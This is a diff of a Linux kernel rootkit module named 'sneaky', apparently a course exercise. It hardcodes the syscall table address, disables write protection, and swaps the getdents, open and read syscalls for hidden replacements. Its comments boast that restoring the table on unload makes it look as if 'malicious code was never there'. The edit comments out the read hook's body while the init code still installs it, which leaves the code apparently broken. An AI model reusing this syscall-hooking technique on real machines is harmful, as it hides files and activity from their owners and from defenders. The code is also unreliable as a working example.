@@ -1,3 +1,5 @@
+
+
 #include <linux/module.h>      // for all modules 
 #include <linux/init.h>        // for entry/exit macros 
 #include <linux/kernel.h>      // for printk and other kernel bits 
@@ -12,7 +14,6 @@
 //ffffffff81077be0 T set_pages_ro
 //ffffffff81077c50 T set_pages_rw
 //ffffffff81e001a0 R sys_call_table
-
 
 
 #define BUFFLEN 512
@@ -62,11 +63,9 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81e001a0;
 //This is used for all system calls.
 
 
-//asmlinkage int (*original_open)(const char *pathname, int flags); //for open syscal
-
-asmlinkage int (*original_call)(const char * pathname, int flags); //for open syscall
+asmlinkage int (*original_read)(int fd, void * buf, size_t count); //for read syscall
+asmlinkage int (*original_open)(const char *pathname, int flags); //for open syscall
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count); //for getdents syscall
-asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count); //for read syscall
 
 
 
@@ -118,11 +117,11 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 
 
 //Define our new sneaky_version of the 'read' syscall
-asmlinkage int sneaky_sys_read(int fd, void * buf, size_t count){
+/*asmlinkage int sneaky_sys_read(int fd, void * buf, size_t count){
 
   return 0;
 }
-
+*/
 
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -144,11 +143,10 @@ static int initialize_sneaky_module(void)
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
 
-    //for getdents
+  //for getdents
   original_getdents = (void*)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
-
-  
+ 
   //for open
   original_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
@@ -157,9 +155,7 @@ static int initialize_sneaky_module(void)
   original_read = (void*)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
-  
-  
-  
+   
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -186,11 +182,11 @@ static void exit_sneaky_module(void)
 
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
+  
   *(sys_call_table + __NR_open) = (unsigned long)original_open;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
-  
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
